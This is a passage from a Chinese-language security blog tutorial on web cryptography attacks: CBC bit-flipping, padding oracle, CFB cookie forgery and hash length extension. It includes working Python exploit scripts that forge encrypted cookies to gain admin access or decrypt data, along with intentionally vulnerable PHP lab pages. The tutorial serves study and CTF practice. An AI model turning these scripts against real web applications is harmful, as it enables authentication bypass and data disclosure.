class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://10.10.10.1/test/cbc/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getCookies</span>():</span><br><span class="line">	<span class="keyword">global</span> url</span><br><span class="line">	data = &#123;</span><br><span class="line">		<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;1dmin&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;12345&#x27;</span>,</span><br><span class="line">	&#125;</span><br><span class="line">	cookies = requests.post(url, data=data).cookies</span><br><span class="line">	<span class="keyword">return</span> cookies</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">cookies</span>):</span><br><span class="line">	<span class="keyword">global</span> url</span><br><span class="line">	</span><br><span class="line">	cipher = base64.b64decode(urllib.unquote(cookies[<span class="string">&#x27;cipher&#x27;</span>]))</span><br><span class="line">	pos = <span class="number">9</span> <span class="comment">#偏移量为9</span></span><br><span class="line">	cipher = cipher[<span class="number">0</span>:pos] + <span class="built_in">chr</span>(<span class="built_in">ord</span>(cipher[pos]) ^ <span class="built_in">ord</span>(<span class="string">&#x27;1&#x27;</span>) ^ <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)) + cipher[pos+<span class="number">1</span>:]</span><br><span class="line">	cipher = urllib.quote_plus(base64.b64encode(cipher))</span><br><span class="line">	cookies = &#123;</span><br><span class="line">		<span class="string">&#x27;PHPSESSID&#x27;</span>: cookies[<span class="string">&#x27;PHPSESSID&#x27;</span>],</span><br><span class="line">		<span class="string">&#x27;iv&#x27;</span>	   : cookies[<span class="string">&#x27;iv&#x27;</span>],</span><br><span class="line">		<span class="string">&#x27;cipher&#x27;</span>   : cipher,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	r = requests.get(url, cookies=cookies)</span><br><span class="line">	<span class="comment">#print r.text</span></span><br><span class="line">	plain = base64.b64decode(re.findall(<span class="string">r&#x27;base64.decode\((.*?)\)&#x27;</span>, r.text)[<span class="number">0</span>])</span><br><span class="line">	iv = base64.b64decode(urllib.unquote(cookies[<span class="string">&#x27;iv&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">	old = plain[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line">	new = <span class="string">&#x27;a:2:&#123;s:8:&quot;userna&#x27;</span></span><br><span class="line">	newiv = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">ord</span>(iv[i]) ^ <span class="built_in">ord</span>(old[i]) ^ <span class="built_in">ord</span>(new[i])) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">16</span>)])	</span><br><span class="line">	newiv = urllib.quote_plus(base64.b64encode(newiv))</span><br><span class="line"></span><br><span class="line">	cookies = &#123;</span><br><span class="line">		<span class="string">&#x27;PHPSESSID&#x27;</span>: cookies[<span class="string">&#x27;PHPSESSID&#x27;</span>],</span><br><span class="line">		<span class="string">&#x27;iv&#x27;</span>	   : newiv,</span><br><span class="line">		<span class="string">&#x27;cipher&#x27;</span>   : cipher,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	r = requests.get(url, cookies=cookies)</span><br><span class="line">	<span class="built_in">print</span> (r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	cookies = getCookies()</span><br><span class="line">	exploit(cookies)</span><br></pre></td></tr></table></figure>
<p>cbc就介绍这么多<br><a name="POA"></a></p>
<h3 id="padding-oracle-attack"><a href="#padding-oracle-attack" class="headerlink" title="padding oracle attack"></a>padding oracle attack</h3><p>padding oracle attack其实也是对cbc模式加密的一种攻击，具体分析下面这篇文章介绍的很详细，不再赘述。<br><a target="_blank" href="http://www.freebuf.com/articles/web/15504.html">我对Padding Oracle攻击的分析和思考（详细）</a><br>这里截取一些重要的部分（划个重点~）</p>
<blockquote>
<p>攻击成立的两个重要条件<br>    1. 攻击者能够获得密文（Ciphertext），以及附带在密文前面的IV（初始化向量）<br>    2. 攻击者能够触发密文的解密过程，且能够知道密文的解密结果  </p>
</blockquote>
<blockquote>
<p>padding只有可能在0x01~0x08之间</p>
</blockquote>
<p>还有一些我们看着测试代码来分析，代码取自下面两位大佬的blog。<br><a target="_blank" href="http://blog.csdn.net/qq_19876131/article/details/52674589">padding oracle攻击原理分析(附带rsa资料)</a><br><a target="_blank" href="http://www.bertramc.cn/2017/03/25/19.html">从DES加密到Padding Oracle Attack</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="string">&#x27;bertram&#x27;</span>;</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&#x27;123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$cipher</span> = MCRYPT_DES;</span><br><span class="line">    <span class="variable">$modes</span> = MCRYPT_MODE_CBC;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;iv&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$iv</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;iv&#x27;</span>]);</span><br><span class="line">        <span class="comment">#echo $iv;</span></span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>]);</span><br><span class="line">        <span class="variable">$decode</span> = <span class="title function_ invoke__">mcrypt_decrypt</span>(<span class="variable">$cipher</span>, <span class="variable">$key</span>, <span class="variable">$str</span>, <span class="variable">$modes</span>, <span class="variable">$iv</span>);</span><br><span class="line">        <span class="comment">#echo bin2hex($iv).&quot;br&gt;&quot;;</span></span><br><span class="line">        <span class="comment">#echo bin2hex($encode).&quot;br&gt;&quot;;</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$decode</span>);</span><br><span class="line">        <span class="variable">$temp</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$decode</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$iv</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="string">&quot;08fe1649311fd298&quot;</span>);</span><br><span class="line">        <span class="variable">$encode</span> = <span class="title function_ invoke__">mcrypt_encrypt</span>(<span class="variable">$cipher</span>, <span class="variable">$key</span>, <span class="variable">$string</span>, <span class="variable">$modes</span>, <span class="variable">$iv</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;the iv is &lt;h2&gt;&quot;</span>.<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$iv</span>).<span class="string">&quot;&lt;/h2&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;the cipher is &lt;h2&gt;&quot;</span>.<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$encode</span>).<span class="string">&quot;&lt;/h2&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果代码运行不了的话应该是没有安装或php没有开启<code>Mcrypt</code>扩展。<br>首先什么参数也不加，获取iv及密文，满足攻击所需的两个条件。<br><img src="http://seaii-blog.com/usr/uploads/2017/05/p1.png"></p>
<p>接着我们将密文取出，并将iv置为<code>0000000000000000</code></p>
<p><img src="http://seaii-blog.com/usr/uploads/2017/05/p2.png"></p>
<p>下面就是不断调整iv直到算出正确的padding</p>
<p><img src="http://seaii-blog.com/usr/uploads/2017/05/p3.png"></p>
<p>这里个人认为还是要把这个图解释一下，图中的<code>Intermediary Value</code>是中间值，<code>Initialization Vector</code>才是初始化的iv。<br>以测试代码为例，padding 0x01的结果为</p>
<p><img src="http://seaii-blog.com/usr/uploads/2017/05/p4.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">中间值 ^ 0x99 = 0x01</span><br><span class="line">中间值 = 0x99 ^ 0x01 = 0x98</span><br><span class="line">明文 = 中间值 ^ 原始iv = 0x98 ^ 0x98 = 0x00 </span><br></pre></td></tr></table></figure>
<p>同理padding 0x02，需要再次调整iv（0x98 ^ 0x02 &#x3D; 0x9a），这地方可能有点绕，靠个人理解吧。。。<br>利用脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#方便起见直接将iv和密文写死</span></span><br><span class="line"><span class="comment">#需要获得这两个值才能进行padding oracle attack攻击</span></span><br><span class="line">iv     = <span class="string">&#x27;08fe1649311fd298&#x27;</span></span><br><span class="line">cipher = <span class="string">&#x27;262b4647cc70d363&#x27;</span></span><br><span class="line"></span><br><span class="line">url    = <span class="string">&#x27;http://seaii-blog.com/test/padding.php&#x27;</span></span><br><span class="line">tmp_iv = <span class="string">&#x27;0000000000000000&#x27;</span></span><br><span class="line"></span><br><span class="line">tail = <span class="string">&#x27;&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">9</span>):  <span class="comment">#iv长度为16，8个分组</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">256</span>): <span class="comment">#0x00~0xff进行穷举</span></span><br><span class="line">        <span class="comment">#两位为一组，不满两位补0</span></span><br><span class="line">        test = (<span class="string">&#x27;0&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(j)[<span class="number">2</span>:])) <span class="keyword">if</span> j &lt; <span class="number">16</span> <span class="keyword">else</span> <span class="built_in">str</span>(<span class="built_in">hex</span>(j)[<span class="number">2</span>:])   </span><br><span class="line">        <span class="comment">#构造测试iv</span></span><br><span class="line">        test_iv = tmp_iv[i*<span class="number">2</span>:] + test + tail</span><br><span class="line">        <span class="comment">#print test_iv</span></span><br><span class="line"></span><br><span class="line">        r = requests.get(url, params=&#123;<span class="string">&#x27;iv&#x27;</span>: test_iv, <span class="string">&#x27;str&#x27;</span>: cipher&#125;)</span><br><span class="line">        tmp = r.text</span><br><span class="line">        <span class="keyword">if</span> tmp[(<span class="number">8</span>-i)*<span class="number">2</span>:(<span class="number">9</span>-i)*<span class="number">2</span>] == <span class="string">&#x27;0&#x27;</span>+<span class="built_in">str</span>(i):</span><br><span class="line">            <span class="comment">#计算中间值</span></span><br><span class="line">            mid_val = <span class="built_in">eval</span>(<span class="string">&#x27;0x&#x27;</span>+test) ^ <span class="built_in">eval</span>(<span class="string">&#x27;0x&#x27;</span>+<span class="built_in">str</span>(i))   </span><br><span class="line">            <span class="comment">#计算明文（中间值 ^ 原iv）</span></span><br><span class="line">            result = <span class="built_in">chr</span>(mid_val ^ <span class="built_in">eval</span>(<span class="string">&#x27;0x&#x27;</span>+iv[(<span class="number">8</span>-i)*<span class="number">2</span>:(<span class="number">9</span>-i)*<span class="number">2</span>])) + result</span><br><span class="line">            <span class="comment">#修改iv进行下一轮攻击</span></span><br><span class="line">            tail = <span class="built_in">hex</span>(mid_val ^ <span class="built_in">eval</span>(<span class="string">&#x27;0x&#x27;</span>+<span class="built_in">str</span>(i+<span class="number">1</span>)))[<span class="number">2</span>:] + tail</span><br><span class="line">            <span class="built_in">print</span> test_iv</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> result</span><br></pre></td></tr></table></figure>
<p>只测试了第一轮，运行结果如下：<br><img src="http://seaii-blog.com/usr/uploads/2017/05/p5.png"></p>
<p>如果想测试下一分组，根据cbc加密的原理，只要把iv换为第一分组的密文即可。</p>
<p>利用工具：</p>
<ul>
<li><a target="_blank" href="https://github.com/mpgn/Padding-oracle-attack/blob/master/exploit.py">https://github.com/mpgn/Padding-oracle-attack/blob/master/exploit.py</a></li>
<li><a target="_blank" href="https://github.com/GDSSecurity/PadBuster">https://github.com/GDSSecurity/PadBuster</a></li>
</ul>
<p>实战： <a target="_blank" href="https://www.secpulse.com/archives/3537.html">Padding Oracle Attack 笔记</a><br><a name="CFB"></a></p>
<h3 id="CFB"><a href="#CFB" class="headerlink" title="CFB"></a>CFB</h3><p>参考：<a target="_blank" href="http://www.cnblogs.com/dacainiao/p/5521930.html">分组密码模式: CFB模式(密文反馈模式)</a><br><img src="http://seaii-blog.com/usr/uploads/2017/05/cfb.jpg"></p>
<p>cfb的题目比较少，在这里找到了一个Hitcon 2015的题目<br><a href="https://nusgreyhats.org/write-ups/HITCONCTF-Quals-2015-Simple-(Crypto-100)/" target="_blank">https://nusgreyhats.org/write-ups/HITCONCTF-Quals-2015-Simple-(Crypto-100)/</a><br>原题是用ruby写的，这里转化为php。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    //error_reporting(0);</span><br><span class="line">    define(&quot;SECRET_KEY&quot;, &#x27;kH3LH3sk45HLsd3n&#x27;);</span><br><span class="line">    define(&quot;METHOD&quot;, &quot;aes-128-cfb&quot;);</span><br><span class="line"></span><br><span class="line">    function get_random_iv() &#123;</span><br><span class="line">        $random_iv = &#x27;&#x27;;</span><br><span class="line">        for($i = 0; $i &lt; 16; $i++)&#123;</span><br><span class="line">            $random_iv .= chr(rand(1, 255));</span><br><span class="line">        &#125;</span><br><span class="line">        return $random_iv;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $username = @$_POST[&#x27;user&#x27;];</span><br><span class="line">    $password = @$_POST[&#x27;pass&#x27;];</span><br><span class="line"></span><br><span class="line">    if(isset($username) &amp;&amp; isset($password)) &#123;    </span><br><span class="line">        $iv = get_random_iv();</span><br><span class="line">        </span><br><span class="line">        $info = array(</span><br><span class="line">            &#x27;username&#x27; =&gt; $username,</span><br><span class="line">            &#x27;password&#x27; =&gt; $password,</span><br><span class="line">        );</span><br><span class="line">        $info = json_encode($info);</span><br><span class="line">        $cipher = openssl_encrypt($info, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">        </span><br><span class="line">        setcookie(&#x27;iv&#x27;, $iv);</span><br><span class="line">        setcookie(&#x27;auth&#x27;, $cipher);</span><br><span class="line">        header(&#x27;Location: cfb.php&#x27;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        if(isset($_COOKIE[&#x27;auth&#x27;]) &amp;&amp; isset($_COOKIE[&#x27;iv&#x27;]))&#123;</span><br><span class="line">            $cipher = $_COOKIE[&#x27;auth&#x27;];</span><br><span class="line">            $iv = $_COOKIE[&#x27;iv&#x27;];</span><br><span class="line">            $info = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">            $info = (array)json_decode($info);</span><br><span class="line"></span><br><span class="line">            if($info[&#x27;admin&#x27;] === true)&#123;</span><br><span class="line">                exit(&#x27;flag&#123;123456&#125;&#x27;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                echo &#x27;Hello &#x27;.$info[&#x27;username&#x27;];    </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &#x27;&lt;body&gt;</span><br><span class="line">                  &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">                      &lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;</span><br><span class="line">                      &lt;input type=&quot;password&quot; name=&quot;pass&quot;&gt;&lt;br&gt;</span><br><span class="line">                      &lt;input type=&quot;submit&quot; value=&quot;register&quot;&gt;</span><br><span class="line">                  &lt;/form&gt;</span><br><span class="line">                  &lt;/body&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> ?&gt;</span><br><span class="line"> &lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>套路和上面的都差不多，注册一个用户，将usernaem和password json一下，然后加密存到cookie中，json_decode之后<code>info[&#39;admin&#39;] === true</code>即可。但是正常情况下应该只有info[‘username’]和info[‘password’]。<br>利用脚本如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://10.10.10.1/test/cfb.php&#x27;</span></span><br><span class="line">cookies = requests.post(url, data=&#123;<span class="string">&#x27;user&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;pass&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>&#125;, allow_redirects=<span class="literal">False</span>).cookies</span><br><span class="line"></span><br><span class="line">old_iv = urllib.unquote(cookies[<span class="string">&#x27;iv&#x27;</span>]).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">cipher = urllib.unquote(cookies[<span class="string">&#x27;auth&#x27;</span>]).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">first_block = cipher[<span class="number">0</span>:<span class="number">32</span>] <span class="comment">#取第一个密文分组</span></span><br><span class="line">plain = <span class="string">&#x27;&#123;&quot;username&quot;:&quot;1&quot;,&#x27;</span> <span class="comment">#与上面对应的明文分组</span></span><br><span class="line"><span class="comment">#注意看上面的加密过程，iv是先经过加密之后再与明文进行xor得到密文</span></span><br><span class="line"><span class="comment">#这个加密过程我们不知道，可以通过密文 ^ 明文得到加密后的iv</span></span><br><span class="line">encrypted_iv = <span class="built_in">hex</span>(<span class="built_in">int</span>(plain.encode(<span class="string">&#x27;hex&#x27;</span>), <span class="number">16</span>) ^ <span class="built_in">int</span>(first_block, <span class="number">16</span>))[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改明文获取新的密文</span></span><br><span class="line">new_plain = <span class="string">&#x27;&#123;&quot;admin&quot;: true &#125;&#x27;</span></span><br><span class="line">new_cipher = <span class="built_in">hex</span>(<span class="built_in">int</span>(encrypted_iv, <span class="number">16</span>) ^ <span class="built_in">int</span>(new_plain.encode(<span class="string">&#x27;hex&#x27;</span>), <span class="number">16</span>))[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">new_cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;auth&#x27;</span>: urllib.quote_plus(new_cipher.decode(<span class="string">&#x27;hex&#x27;</span>)),</span><br><span class="line">    <span class="string">&#x27;iv&#x27;</span>  : cookies[<span class="string">&#x27;iv&#x27;</span>],</span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url, cookies=new_cookies)</span><br><span class="line"><span class="built_in">print</span> r.text</span><br></pre></td></tr></table></figure>
<p>具体分析代码中写的很详细了，但是这个题目没有体现cfb最典型的攻击——重放攻击，关于这种攻击的一个题目见：<a href="http://www.ifuryst.com/archives/AES_CFB_Attack.html" target="_blank">cfb重放攻击</a><br><img src="http://seaii-blog.com/usr/uploads/2017/05/cfb2.jpg"></p>
<p><a name="HASH"></a></p>
<h3 id="hash长度扩展攻击"><a href="#hash长度扩展攻击" class="headerlink" title="hash长度扩展攻击"></a>hash长度扩展攻击</h3><p>详细介绍见另一篇博文：<a target="_blank" href="http://seaii-blog.com/index.php/2017/05/12/56.html">hash长度扩展攻击研究</a></p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul>
<li><a target="_blank" href="http://bobao.360.cn/learning/detail/3100.html">常见的Web 密码学攻击方式汇总 </a>  特别感谢这位大佬，代码和例子都给的非常详细</li>
<li>其他的文章都放在文中了</li>
</ul>

        
        <br />
        <div id="comment-container">
        </div>
        <div id="disqus_thread"></div>
        <div id="lv-container"></div>
        <div class="giscus"></div>
    </div>
</div>

    </div>
</div>


<footer class="footer">
    <ul class="list-inline text-center">
        
        

        

        

        

        

    </ul>
    
    <p>
        <span id="busuanzi_container_site_pv">
            <span id="busuanzi_value_site_pv"></span>PV
        </span>
        <span id="busuanzi_container_site_uv">
            <span id="busuanzi_value_site_uv"></span>UV
        </span>
        Created By <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>  Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
</footer>




</body>

<script>
    // We expose some of the variables needed by the front end
    window.hexo_search_path = ""
    window.hexo_root = "/"
    window.isPost = true
</script>
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>

<script src="/js/index.js"></script>

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>






</html>
